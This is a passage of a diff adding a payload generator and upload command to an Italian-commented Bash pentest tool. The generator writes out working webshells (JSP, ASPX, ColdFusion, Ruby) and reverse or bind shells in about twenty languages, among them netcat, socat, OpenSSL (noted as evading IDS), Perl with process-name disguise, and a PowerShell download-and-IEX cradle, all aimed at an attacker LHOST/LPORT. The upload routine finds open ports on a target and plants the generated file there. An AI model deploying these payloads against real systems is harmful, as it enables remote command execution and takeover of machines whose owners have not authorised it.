+function printit(\$s) {
+    global \$daemon;
+    if (!\$daemon) print "\$s\n";
+}
+?>
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  JSP webshell — tennc/webshell cmd.jsp
+    #  Fonte: github.com/tennc/webshell (public)
+    #  Verificato: repository security research pubblico,
+    #              usato da anni in CTF e pentesting
+    # ════════════════════════════════════════════
+    jsp-kit)
+        cat <<'SCRIPT'
+<%@ page import="java.util.*,java.io.*"%>
+<%
+// JSP_KIT — cmd.jsp (tennc/webshell, github.com/tennc/webshell)
+// exa-dune: webshell JSP comando via parametro GET/POST "cmd"
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd" style="width:400px" placeholder="comando">
+<INPUT TYPE="submit" VALUE="Esegui">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+    out.println("Comando: " + request.getParameter("cmd") + "<BR>");
+    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+    OutputStream os = p.getOutputStream();
+    InputStream  in = p.getInputStream();
+    DataInputStream dis = new DataInputStream(in);
+    String disr = dis.readLine();
+    while (disr != null) {
+        out.println(disr);
+        disr = dis.readLine();
+    }
+}
+%>
+</pre>
+</BODY></HTML>
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  ASPX webshell — Laudanum Project
+    #  Fonte: laudanum.secureideas.net
+    #         github.com/jbarcia/Web-Shells (GPL v2)
+    #  Autori: Kevin Johnson, Tim Medin (SecureIdeas)
+    #  Verificato: framework di pentesting legittimo,
+    #              include IP whitelist per accesso sicuro
+    # ════════════════════════════════════════════
+    aspx-laudanum)
+        cat <<SCRIPT
+<%@ Page Language="C#"%>
+<%@ Import Namespace="System" %>
+<!-- Laudanum ASPX Shell — laudanum.secureideas.net (GPL v2)   -->
+<!-- Autori: Kevin Johnson, Tim Medin — exa-dune wrapper       -->
+<!-- WHITELIST IP: modifica allowedIps con il tuo IP attacker  -->
+<script runat="server">
+string stdout = "";
+string stderr = "";
+
+void die() {
+    HttpContext.Current.Response.StatusCode = 404;
+    HttpContext.Current.Response.StatusDescription = "Not Found";
+    HttpContext.Current.Response.Write("<h1>404 Not Found</h1>");
+    HttpContext.Current.Server.ClearError();
+    HttpContext.Current.Response.End();
+}
+
+void Page_Load(object sender, System.EventArgs e) {
+    // ── Whitelist IP: solo l'attacker può accedere ──────────
+    string[] allowedIps = new string[] { "${lhost}", "127.0.0.1", "::1" };
+    string remoteIp = HttpContext.Current.Request.Headers["X-Forwarded-For"] != null
+        ? HttpContext.Current.Request.Headers["X-Forwarded-For"].Split(',')[0]
+        : Request.UserHostAddress;
+
+    bool validIp = false;
+    foreach (string ip in allowedIps) validIp = validIp || (remoteIp == ip);
+    if (!validIp) { die(); return; }
+
+    if (Request.Form["c"] != null) {
+        var psi = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + Request.Form["c"]) {
+            RedirectStandardOutput = true,
+            RedirectStandardError  = true,
+            UseShellExecute        = false,
+            CreateNoWindow         = true
+        };
+        var p = System.Diagnostics.Process.Start(psi);
+        stdout = p.StandardOutput.ReadToEnd();
+        stderr = p.StandardError.ReadToEnd();
+    }
+}
+</script>
+<html><head><title>Shell</title></head>
+<body onload="document.shell.c.focus()">
+<form method="post" name="shell">
+  cmd /c <input type="text" name="c" size="60"/>
+  <input type="submit" value="Esegui"/><br/>
+  <b>STDOUT:</b><pre><% = stdout.Replace("<","&lt;") %></pre>
+  <b>STDERR:</b><pre><% = stderr.Replace("<","&lt;") %></pre>
+</form>
+</body></html>
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Perl reverse shell — pentestmonkey (daemon CGI)
+    #  Fonte: github.com/jbarcia/Web-Shells (GPL v2)
+    #         originale: pentestmonkey@pentestmonkey.net
+    #  Verificato: GPL v2, tool pentesting storico e legittimo
+    # ════════════════════════════════════════════
+    pl-monkey)
+        cat <<SCRIPT
+#!/usr/bin/perl -w
+# perl-reverse-shell — pentestmonkey@pentestmonkey.net (GPL v2)
+# Fonte: github.com/pentestmonkey/perl-reverse-shell
+# Solo per usi legali e assessment autorizzati.
+# exa-dune: LHOST=${lhost} LPORT=${lport}
+
+use strict;
+use Socket;
+use FileHandle;
+use POSIX;
+
+my \$ip              = '${lhost}';
+my \$port            = ${lport};
+my \$daemon          = 1;
+my \$fake_proc_name  = "/usr/sbin/apache";
+
+\$0 = "[httpd]";   # cambia nome processo
+
+# Background
+if (\$daemon) {
+    my \$pid = fork();
+    if (\$pid) { exit(0); }
+    setsid();
+    chdir('/');
+    umask(0);
+}
+
+# Connessione TCP reverse
+socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
+if (connect(SOCK, sockaddr_in(\$port, inet_aton(\$ip)))) {
+    open(STDIN,  ">&SOCK");
+    open(STDOUT, ">&SOCK");
+    open(STDERR, ">&SOCK");
+    \$ENV{'HISTFILE'} = '/dev/null';
+    system("w;uname -a;id;pwd");
+    exec({ "/bin/sh" } (\$fake_proc_name, "-i"));
+} else {
+    die "Connessione fallita a \$ip:\$port: \$!";
+}
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Node.js reverse shell
+    #  Fonte: swisskyrepo/PayloadsAllTheThings (MIT)
+    #  Verificato: repository security research pubblico
+    # ════════════════════════════════════════════
+    nodejs-revshell)
+        cat <<SCRIPT
+// exa-dune :: nodejs-revshell → ${lhost}:${lport}
+// Fonte: swisskyrepo/PayloadsAllTheThings (MIT License)
+(function(){
+    var net = require("net"),
+        cp  = require("child_process"),
+        sh  = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(${lport}, "${lhost}", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Golang reverse shell
+    #  Fonte: swisskyrepo/PayloadsAllTheThings (MIT)
+    #  Verificato: repository security research pubblico
+    # ════════════════════════════════════════════
+    go-revshell)
+        cat <<SCRIPT
+// exa-dune :: go-revshell → ${lhost}:${lport}
+// Fonte: swisskyrepo/PayloadsAllTheThings (MIT License)
+// Compilare: go build -o shell shell.go && ./shell
+// Oppure one-liner: go run shell.go
+package main
+
+import (
+    "net"
+    "os/exec"
+)
+
+func main() {
+    c, _ := net.Dial("tcp", "${lhost}:${lport}")
+    cmd   := exec.Command("/bin/sh")
+    cmd.Stdin  = c
+    cmd.Stdout = c
+    cmd.Stderr = c
+    cmd.Run()
+}
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Groovy reverse shell (Jenkins pipeline)
+    #  Fonte: swisskyrepo/PayloadsAllTheThings (MIT)
+    #  Verificato: repository security research pubblico
+    # ════════════════════════════════════════════
+    groovy-revshell)
+        cat <<SCRIPT
+// exa-dune :: groovy-revshell → ${lhost}:${lport}
+// Fonte: swisskyrepo/PayloadsAllTheThings (MIT License)
+// Uso tipico: Jenkins Script Console (Manage Jenkins > Script Console)
+String host = "${lhost}";
+int    port = ${lport};
+String cmd  = "/bin/bash";
+
+Process p = new ProcessBuilder(cmd)
+    .redirectErrorStream(true).start();
+Socket  s = new Socket(host, port);
+
+InputStream  pi = p.getInputStream(),
+             pe = p.getErrorStream(),
+             si = s.getInputStream();
+OutputStream po = p.getOutputStream(),
+             so = s.getOutputStream();
+
+while (!s.isClosed()) {
+    while (pi.available() > 0) so.write(pi.read());
+    while (pe.available() > 0) so.write(pe.read());
+    while (si.available() > 0) po.write(si.read());
+    so.flush(); po.flush();
+    Thread.sleep(50);
+    try { p.exitValue(); break; } catch (Exception e) {}
+}
+p.destroy();
+s.close();
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Lua reverse shell
+    #  Fonte: swisskyrepo/PayloadsAllTheThings (MIT)
+    #  Verificato: repository security research pubblico
+    #  Nota: richiede luasocket (lua5.1+)
+    # ════════════════════════════════════════════
+    lua-revshell)
+        cat <<SCRIPT
+-- exa-dune :: lua-revshell → ${lhost}:${lport}
+-- Fonte: swisskyrepo/PayloadsAllTheThings (MIT License)
+-- Eseguire: lua5.1 shell.lua  oppure  lua shell.lua
+-- Richiede: luarocks install luasocket
+local host   = "${lhost}"
+local port   = ${lport}
+local socket = require("socket")
+local io     = require("io")
+local tcp    = socket.tcp()
+
+tcp:connect(host, port)
+while true do
+    local cmd, status = tcp:receive()
+    local f  = io.popen(cmd, "r")
+    local s  = f:read("*a")
+    f:close()
+    tcp:send(s)
+    if status == "closed" then break end
+end
+tcp:close()
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Awk reverse shell (/inet/tcp — no binari)
+    #  Fonte: swisskyrepo/PayloadsAllTheThings (MIT)
+    #  Verificato: repository security research pubblico
+    #  Nota: funziona con gawk, non mawk
+    # ════════════════════════════════════════════
+    awk-revshell)
+        cat <<SCRIPT
+#!/usr/bin/awk -f
+# exa-dune :: awk-revshell → ${lhost}:${lport}
+# Fonte: swisskyrepo/PayloadsAllTheThings (MIT License)
+# Richiede gawk (GNU awk) con supporto /inet/tcp
+# Eseguire: awk -f shell.awk /dev/null
+# Oppure one-liner:
+#   awk 'BEGIN{s="/inet/tcp/0/${lhost}/${lport}";while(42){do{printf "shell>" |& s;s |& getline c;if(c){while((c |& getline)>0)print \$0 |& s;close(c)}}while(c!="exit")close(s)}}' /dev/null
+BEGIN {
+    s = "/inet/tcp/0/${lhost}/${lport}"
+    while (42) {
+        do {
+            printf "shell>" |& s
+            s |& getline c
+            if (c) {
+                while ((c |& getline) > 0)
+                    print \$0 |& s
+                close(c)
+            }
+        } while (c != "exit")
+        close(s)
+    }
+}
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  OpenSSL encrypted reverse shell
+    #  Fonte: swisskyrepo/PayloadsAllTheThings (MIT)
+    #  Verificato: repository security research pubblico
+    #  Nota: traffico cifrato TLS — evita IDS plaintext
+    # ════════════════════════════════════════════
+    openssl-revshell)
+        cat <<SCRIPT
+#!/bin/sh
+# exa-dune :: openssl-revshell — reverse shell cifrata TLS
+# Fonte: swisskyrepo/PayloadsAllTheThings (MIT License)
+# LHOST=${lhost}  LPORT=${lport}
+#
+# ── Attacker (listener SSL) ─────────────────────────────────
+#   openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=test'
+#   openssl s_server -quiet -key key.pem -cert cert.pem -port ${lport}
+#
+# ── Victim (questo script) ──────────────────────────────────
+LHOST="${lhost}"
+LPORT="${lport}"
+mkfifo /tmp/.ssl_pipe
+/bin/sh -i < /tmp/.ssl_pipe 2>&1 | \
+    openssl s_client -quiet -connect "\${LHOST}:\${LPORT}" > /tmp/.ssl_pipe
+rm -f /tmp/.ssl_pipe
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Socat full PTY reverse shell
+    #  Fonte: swisskyrepo/InternalAllTheThings
+    #  Verificato: repository security research pubblico
+    #  Nota: shell PTY completa con supporto Tab/Ctrl+C
+    # ════════════════════════════════════════════
+    socat-shell)
+        cat <<SCRIPT
+#!/bin/sh
+# exa-dune :: socat-shell — PTY reverse shell completa
+# Fonte: swisskyrepo/InternalAllTheThings
+# LHOST=${lhost}  LPORT=${lport}
+#
+# ── Attacker (listener) ─────────────────────────────────────
+#   socat file:\$(tty),raw,echo=0 TCP-L:${lport}
+#
+# ── Victim (questo script) ────────────────────────────────��─
+# Richiede socat installato sul target
+LHOST="${lhost}"
+LPORT="${lport}"
+
+if command -v socat >/dev/null 2>&1; then
+    socat exec:'bash -li',pty,stderr,setsid,sigint,sane "tcp:\${LHOST}:\${LPORT}"
+else
+    # Fallback senza socat
+    bash -i >& /dev/tcp/\${LHOST}/\${LPORT} 0>&1
+fi
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Python pty upgrade (stabilizza una shell)
+    #  Fonte: swisskyrepo/InternalAllTheThings
+    #  Verificato: repository security research pubblico
+    #  Nota: da eseguire su una shell già ottenuta
+    # ════════════════════════════════════════════
+    py-pty)
+        cat <<'SCRIPT'
+#!/usr/bin/env python3
+# exa-dune :: py-pty — upgrade shell a PTY interattiva
+# Fonte: swisskyrepo/InternalAllTheThings
+# Eseguire su una shell già ottenuta per avere Tab, history, Ctrl+C
+
+import pty, os, subprocess
+
+# Metodo 1: pty.spawn (più semplice)
+pty.spawn("/bin/bash")
+
+# Metodo 2: alternativo con /bin/sh
+# pty.spawn("/bin/sh")
+
+# Metodo 3: one-liner da incollare direttamente nella shell esistente:
+# python3 -c 'import pty; pty.spawn("/bin/bash")'
+#
+# Dopo pty.spawn, sulla macchina attacker:
+#   Ctrl+Z (background)
+#   stty raw -echo; fg
+#   export TERM=xterm
+SCRIPT
+        ;;
+
+    rust-revshell)
+        cat <<SCRIPT
+// rust-reverse-shell
+// Fonte: InternalAllTheThings / PayloadsAllTheThings (MIT License)
+// Solo per usi legali e assessment autorizzati.
+// Compila: rustc shell.rs -o shell && ./shell
+// exa-dune: LHOST=${lhost} LPORT=${lport}
+
+use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+
+fn main() {
+    let s = TcpStream::connect("${lhost}:${lport}").unwrap();
+    let fd = s.as_raw_fd();
+    Command::new("/bin/sh")
+        .arg("-i")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()
+        .unwrap()
+        .wait()
+        .unwrap();
+}
+SCRIPT
+        ;;
+
+    c-revshell)
+        cat <<SCRIPT
+/* c-reverse-shell
+ * Fonte: InternalAllTheThings / PayloadsAllTheThings (MIT License)
+ * Solo per usi legali e assessment autorizzati.
+ * Compila: gcc shell.c -o csh && ./csh
+ * exa-dune: LHOST=${lhost} LPORT=${lport}
+ */
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void) {
+    int port = ${lport};
+    struct sockaddr_in revsockaddr;
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family      = AF_INET;
+    revsockaddr.sin_port        = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("${lhost}");
+    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+    char * const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
+    return 0;
+}
+SCRIPT
+        ;;
+
+    nc-revshell)
+        cat <<SCRIPT
+#!/bin/sh
+# nc-revshell — Netcat tradizionale con -e
+# Fonte: InternalAllTheThings / PayloadsAllTheThings (MIT License)
+# Solo per usi legali e assessment autorizzati.
+# Attacker: nc -lvnp ${lport}
+# exa-dune: LHOST=${lhost} LPORT=${lport}
+nc -e /bin/sh ${lhost} ${lport}
+# Alternativa con bash:
+# nc -e /bin/bash ${lhost} ${lport}
+# Alternativa con -c:
+# nc -c bash ${lhost} ${lport}
+SCRIPT
+        ;;
+
+    nc-openbsd)
+        cat <<SCRIPT
+#!/bin/sh
+# nc-openbsd — Netcat OpenBSD (no -e) via mkfifo
+# Fonte: InternalAllTheThings / PayloadsAllTheThings (MIT License)
+# Solo per usi legali e assessment autorizzati.
+# Attacker: nc -lvnp ${lport}
+# exa-dune: LHOST=${lhost} LPORT=${lport}
+rm -f /tmp/f
+mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc ${lhost} ${lport} > /tmp/f
+SCRIPT
+        ;;
+
+    nc-busybox)
+        cat <<SCRIPT
+#!/bin/sh
+# nc-busybox — Netcat BusyBox via mknod
+# Fonte: InternalAllTheThings / PayloadsAllTheThings (MIT License)
+# Solo per usi legali e assessment autorizzati.
+# Attacker: nc -lvnp ${lport}
+# exa-dune: LHOST=${lhost} LPORT=${lport}
+rm -f /tmp/f
+mknod /tmp/f p
+cat /tmp/f | /bin/sh -i 2>&1 | nc ${lhost} ${lport} > /tmp/f
+SCRIPT
+        ;;
+
+    telnet-revshell)
+        local _lp2
+        if [[ "${lport}" =~ ^[0-9]+$ ]]; then
+            _lp2=$(( lport + 1 ))
+        else
+            _lp2="${lport}_PLUS_1"
+        fi
+        cat <<SCRIPT
+#!/bin/sh
+# telnet-revshell — Reverse shell via telnet (due listener sull'attaccante)
+# Fonte: InternalAllTheThings / PayloadsAllTheThings (MIT License)
+# Solo per usi legali e assessment autorizzati.
+#
+# ATTACKER — avvia due listener:
+#   nc -lvnp ${lport}    (riceve stdout/stderr)
+#   nc -lvnp ${_lp2}    (invia comandi stdin)
+#
+# VICTIM — esegui:
+# exa-dune: LHOST=${lhost} LPORT=${lport}
+telnet ${lhost} ${lport} | /bin/sh | telnet ${lhost} ${_lp2}
+SCRIPT
+        ;;
+
+    sh-bindshell)
+        cat <<SCRIPT
+#!/bin/sh
+# sh-bindshell — Bind shell Bash via mkfifo
+# Attacker: nc <VICTIM_IP> ${lport}
+# exa-dune: LPORT=${lport}
+rm -f /tmp/bp
+mkfifo /tmp/bp
+cat /tmp/bp | /bin/sh -i 2>&1 | nc -l ${lport} > /tmp/bp
+SCRIPT
+        ;;
+
+    ps1-bindshell)
+        cat <<'SCRIPT_RAW'
+# ps1-bindshell — Bind shell PowerShell (TcpListener + IEX loop)
+# Fonte: InternalAllTheThings / PayloadsAllTheThings (MIT License)
+# Solo per usi legali e assessment autorizzati.
+# Attacker: nc <VICTIM_IP> LPORT
+# exa-dune: LPORT=LPORT
+SCRIPT_RAW
+        cat <<SCRIPT
+\$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, ${lport})
+\$listener.Start()
+Write-Host "[*] In ascolto su porta ${lport}..."
+\$client = \$listener.AcceptTcpClient()
+\$stream = \$client.GetStream()
+[byte[]]\$bytes = 0..65535 | ForEach-Object { 0 }
+while ((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0) {
+    \$data = (New-Object System.Text.ASCIIEncoding).GetString(\$bytes, 0, \$i)
+    \$result = (Invoke-Expression \$data 2>&1 | Out-String)
+    \$result += 'PS ' + (Get-Location).Path + '> '
+    \$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes(\$result)
+    \$stream.Write(\$sendbyte, 0, \$sendbyte.Length)
+    \$stream.Flush()
+}
+\$client.Close()
+\$listener.Stop()
+SCRIPT
+        ;;
+
+    ps1-download)
+        cat <<SCRIPT
+# ps1-download — PowerShell download e IEX da URL controllato
+# Fonte: InternalAllTheThings / PayloadsAllTheThings (MIT License)
+# Solo per usi legali e assessment autorizzati.
+# Avvia HTTP server sull'attaccante: python3 -m http.server ${lport}
+# Copia il payload PS1 nella directory servita, poi esegui sul target:
+# exa-dune: LHOST=${lhost} LPORT=${lport}
+
+# Metodo 1 — IEX diretta (bypassa UAC in alcuni contesti):
+IEX (New-Object Net.WebClient).DownloadString("http://${lhost}:${lport}/payload.ps1")
+
+# Metodo 2 — Scarica su disco ed esegui:
+# (New-Object Net.WebClient).DownloadFile("http://${lhost}:${lport}/payload.ps1", "\$env:TEMP\\payload.ps1")
+# & "\$env:TEMP\\payload.ps1"
+
+# Metodo 3 — Invoke-WebRequest (PowerShell 3+):
+# IEX (Invoke-WebRequest "http://${lhost}:${lport}/payload.ps1" -UseBasicParsing).Content
+SCRIPT
+        ;;
+
+    rb-cmd)
+        cat <<'SCRIPT'
+#!/usr/bin/env ruby
+# rb-cmd — Ruby webshell: bind shell semplice + exec via HTTP
+# Fonte: InternalAllTheThings / PayloadsAllTheThings (MIT License)
+# Solo per usi legali e assessment autorizzati.
+# Uso: ruby rb-cmd.rb  poi: curl http://victim/rb-cmd.rb?cmd=id
+require 'socket'
+require 'cgi'
+
+server = TCPServer.new(8181)
+loop do
+  client = server.accept
+  request = client.gets
+  if request =~ /GET \/?cmd=([^\s]+)/
+    cmd = CGI.unescape($1)
+    output = IO.popen(cmd, 'r') { |io| io.read }
+    client.puts "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n#{output}"
+  else
+    client.puts "HTTP/1.1 400 Bad Request\r\n\r\nUso: ?cmd=<comando>"
+  end
+  client.close
+end
+SCRIPT
+        ;;
+
+    dart-revshell)
+        cat <<SCRIPT
+// dart-revshell
+// Fonte: InternalAllTheThings / PayloadsAllTheThings (MIT License)
+// Solo per usi legali e assessment autorizzati.
+// Compila: dart compile exe shell.dart -o shell && ./shell
+// Oppure:  dart run shell.dart
+// exa-dune: LHOST=${lhost} LPORT=${lport}
+
+import 'dart:io';
+import 'dart:convert';
+
+void main() async {
+  final socket = await Socket.connect('${lhost}', ${lport});
+  socket.listen((data) async {
+    final cmd = String.fromCharCodes(data).trim();
+    if (cmd.isEmpty) return;
+    final result = await Process.run('/bin/sh', ['-c', cmd]);
+    final out = result.stdout.toString() + result.stderr.toString();
+    socket.write(out.isEmpty ? '(no output)\n' : out);
+  }, onDone: () => socket.destroy());
+}
+SCRIPT
+        ;;
+
+    cfm-cmd)
+        cat <<'SCRIPT'
+<!---
+ * cfm-cmd — ColdFusion Webshell con autenticazione via header X-Auth-Code
+ * Fonte: Laudanum Project — laudanum.secureideas.net
+ *        Kevin Johnson <kjohnson@secureideas.net> e Tim Medin
+ *        Copyright 2014 Kevin Johnson e il Laudanum Team
+ *        Licenza: GNU General Public License v2
+ *        Solo per usi legali e assessment autorizzati.
+ *
+ * IMPORTANTE: cambia secretCode con un hash SHA1 univoco prima di caricare.
+ * Autenticazione: invia header HTTP  X-Auth-Code: <secretCode>
+ *   oppure includi authCode=<secretCode> nel form POST.
+--->
+<cfapplication scriptProtect="none">
+<cfset secretCode = "a208bddb1f68aa8a8641b65d93979740c82fb387" />
+<cfset QuoteMark = "'" />
+<cfset DoubleQuoteMark = """" />
+
+<cfset suppliedCode = "" />
+<cfif structKeyExists(GetHttpRequestData().headers, "X-Auth-Code")>
+    <cfset suppliedCode = "#StructFind(GetHttpRequestData().headers, 'X-Auth-Code')#" />
+<cfelseif structKeyExists(FORM, "authCode")>
+    <cfset suppliedCode = "#StructFind(FORM, 'authCode')#" />
+</cfif>
+
+<cfif (#suppliedCode# neq secretCode)>
+    <cfheader statuscode="404" statustext="Page Not Found" />
+    <cfabort />
+</cfif>
+
+<html>
+<head><title>ColdFusion Shell</title></head>
+<body>
+<form action="<cfoutput>#cgi.script_name#</cfoutput>" method="POST">
+    <cfif IsDefined("form.cmd")>
+    Eseguibile: <input type="text" name="cmd" value="<cfoutput>#HTMLEditFormat(form.cmd)#</cfoutput>"><br>
+    Argomenti:  <input type="text" name="arguments" value="<cfoutput>#HTMLEditFormat(form.arguments)#</cfoutput>"><br>
+    <cfelse>
+    Eseguibile: <input type="text" name="cmd" value="cmd.exe"><br>
+    Argomenti:  <input type="text" name="arguments" value="/c "><br>
+    </cfif>
+    <input type="hidden" name="authCode" value="<cfoutput>#HTMLEditFormat(suppliedCode)#</cfoutput>">
+    <input type="submit" value="Esegui">
+</form>
+<cfif IsDefined("form.cmd")>
+    <cfset argumentsArray = #listToArray(form.arguments, " ")# />
+    <pre>
+    <cfexecute name="#Replace(preservesinglequotes(form.cmd), QuoteMark, DoubleQuoteMark, 'All')#"
+               arguments="#argumentsArray#" timeout="5" variable="foo"></cfexecute>
+    <cfoutput>#Replace(foo, "<", "&lt;", "All")#</cfoutput>
+    </pre>
+</cfif>
+<hr/><address>Laudanum Project &mdash; laudanum.secureideas.net</address>
+</body>
+</html>
+SCRIPT
+        ;;
+
+    *)
+        err "Tipo sconosciuto: $stype. Usa --list-types per vedere i tipi disponibili."
+        return 1
+        ;;
+    esac
+}
+
+# ── Restituisce estensione per il tipo ───────────────────────
+_upload_type_ext() {
+    local stype="$1"
+    for _e in "${_UPLOAD_TYPES[@]}"; do
+        IFS='|' read -r _ _n _ext _ _ <<< "$_e"
+        [[ "$_n" == "$stype" ]] && { echo "$_ext"; return; }
+    done
+    echo "txt"
+}
+
+# ── Verifica se tipo richiede lhost ─────────────────────────
+_upload_type_needs_lhost() {
+    local stype="$1"
+    for _e in "${_UPLOAD_TYPES[@]}"; do
+        IFS='|' read -r _ _n _ _ _nl <<< "$_e"
+        [[ "$_n" == "$stype" ]] && { echo "$_nl"; return; }
+    done
+    echo "0"
+}
+
+# ── Rileva protocollo dalla porta ────────────────────────────
+_upload_proto_from_port() {
+    local p="$1"
+    case "$p" in
+        21|2121|990)            echo "ftp"   ;;
+        22|2222)                echo "ssh"   ;;
+        69)                     echo "tftp"  ;;
+        80|8080|8000|8008|3000) echo "http"  ;;
+        443|8443|4443|9443)     echo "https" ;;
+        445|139)                echo "smb"   ;;
+        *)                      echo "tcp"   ;;
+    esac
+}
+
+# ── Verifica upload HTTP (GET sul path caricato) ─────────────
+_upload_http_verify() {
+    local base_url="$1" remote_path="$2" no_verify="$3"
+    local curl_opts=(-s -o /dev/null -w "%{http_code}" --connect-timeout 5 -m 8)
+    [[ "$no_verify" -eq 1 ]] && curl_opts+=(-k)
+    local code
+    code=$(curl "${curl_opts[@]}" "${base_url}${remote_path}" 2>/dev/null || echo "000")
+    echo "$code"
+}
+
+cmd_upload() {
+    local target="" local_file="" script_type=""
+    local port="" proto="" remote_path="" user="" pass=""
+    local http_method="auto" no_verify=0
+    local lhost="" lport="4444"
+    local do_list=0 show_type=""
+
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)        _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --proto)       _req_arg "$1" "${2:-}"; proto="$2";       shift 2 ;;
+            --remote-path) _req_arg "$1" "${2:-}"; remote_path="$2"; shift 2 ;;
+            --user)        _req_arg "$1" "${2:-}"; user="$2";        shift 2 ;;
+            --pass)        _req_arg "$1" "${2:-}"; pass="$2";        shift 2 ;;
+            --method)      _req_arg "$1" "${2:-}"; http_method="$2"; shift 2 ;;
+            --type)        _req_arg "$1" "${2:-}"; script_type="$2"; shift 2 ;;
+            --lhost)       _req_arg "$1" "${2:-}"; lhost="$2";       shift 2 ;;
+            --lport)       _req_arg "$1" "${2:-}"; lport="$2";       shift 2 ;;
+            --list-types)  do_list=1;              shift ;;
+            --show-type)   _req_arg "$1" "${2:-}"; show_type="$2";   shift 2 ;;
+            --no-verify)   no_verify=1;            shift ;;
+            --output)      _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run)     DRY_RUN=1;              shift ;;
+            --help|-h)     usage_upload; exit 0 ;;
+            -*)            err "Opzione sconosciuta: $1"; usage_upload; exit 1 ;;
+            *)
+                if   [[ -z "$target" ]];     then target="$1"
+                elif [[ -z "$local_file" ]]; then local_file="$1"
+                else err "Argomento inatteso: $1"; usage_upload; exit 1; fi
+                shift ;;
+        esac
+    done
+
+    # ── Comandi informativi (non richiedono TARGET) ──────────
+    if [[ "$do_list" -eq 1 ]]; then
+        _upload_list_types; exit 0
+    fi
+    if [[ -n "$show_type" ]]; then
+        echo -e "${BOLD}── Sorgente: $show_type ──${NC}"
+        _upload_generate_script "$show_type" "LHOST" "LPORT" || exit 1
+        exit 0
+    fi
+
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_upload; exit 1; }
+
+    # ── Modalità --type: genera script temporaneo ────────────
+    local _tmp_script=""
+    if [[ -n "$script_type" ]]; then
+        local _need_lh; _need_lh=$(_upload_type_needs_lhost "$script_type")
+        if [[ "$_need_lh" -eq 1 && -z "$lhost" ]]; then
+            err "--lhost obbligatorio per il tipo '$script_type'"
+            exit 1
+        fi
+        local _ext; _ext=$(_upload_type_ext "$script_type")
+        _tmp_script=$(mktemp "/tmp/exa_upload_XXXXXX.${_ext}")
+        trap "rm -f '$_tmp_script'" RETURN
+        _upload_generate_script "$script_type" "$lhost" "$lport" > "$_tmp_script" || exit 1
+        local_file="$_tmp_script"
+        log "Script generato: tipo=$script_type → $local_file"
+        [[ "$_need_lh" -eq 1 ]] && log "  Reverse shell → ${lhost}:${lport}"
+    fi
+
+    [[ -z "$local_file" ]] && { err "FILE mancante (o usa --type TIPO)"; usage_upload; exit 1; }
+    [[ ! -f "$local_file" && "${DRY_RUN:-0}" -eq 0 ]] && \
+        { err "File non trovato: $local_file"; exit 1; }
+
+    validate_target "$target"
+    setup_outdir "$target" "upload"
+
+    local fname; fname=$(basename "$local_file")
+    local fext="${fname##*.}"
+    local fsize=""
+    [[ -f "$local_file" ]] && fsize=$(wc -c < "$local_file" 2>/dev/null || echo "?")
+    local fmd5=""
+    [[ -f "$local_file" ]] && fmd5=$(md5sum "$local_file" 2>/dev/null | awk '{print $1}' || true)
+
+    log "Target: $target | File: $fname ($fsize byte, md5: $fmd5) | Output: $OUTDIR"
+
+    # ── Auto-detect porta e protocollo ──────────────────────
+    if [[ -z "$port" && -z "$proto" ]]; then
+        log "  Auto-detect porta aperta..."
+        for _ap in 80 443 21 22 8080 8443 8000 445 69; do
+            if check_port "$target" "$_ap"; then
+                port="$_ap"
+                proto=$(_upload_proto_from_port "$_ap")
+                log "  Porta aperta trovata: $port → protocollo: $proto"
+                break
+            fi
+        done
+        if [[ -z "$port" ]]; then
+            err "Nessuna porta riconosciuta aperta. Specifica --port e --proto manualmente."
+            exit 1
+        fi
+    elif [[ -z "$proto" && -n "$port" ]]; then
+        proto=$(_upload_proto_from_port "$port")
+        log "  Protocollo rilevato dalla porta $port: $proto"
+    elif [[ -z "$port" ]]; then
+        case "$proto" in
+            http)  port=80  ;; https) port=443 ;;
+            ftp)   port=21  ;; ssh)   port=22  ;;
+            tftp)  port=69  ;; smb)   port=445 ;;
